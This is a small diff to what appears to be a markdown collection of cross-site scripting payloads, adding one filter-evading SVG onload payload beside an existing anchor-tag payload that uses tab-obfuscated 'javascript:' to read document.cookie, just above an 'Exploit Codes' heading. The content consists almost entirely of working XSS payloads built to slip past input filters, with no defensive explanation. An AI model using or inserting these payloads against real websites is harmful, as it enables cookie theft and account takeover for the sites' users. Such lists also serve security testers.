@@ -97,6 +97,8 @@
 
 ```<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS```
 
+```<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//```
+
 ---
 > Exploit Codes
 
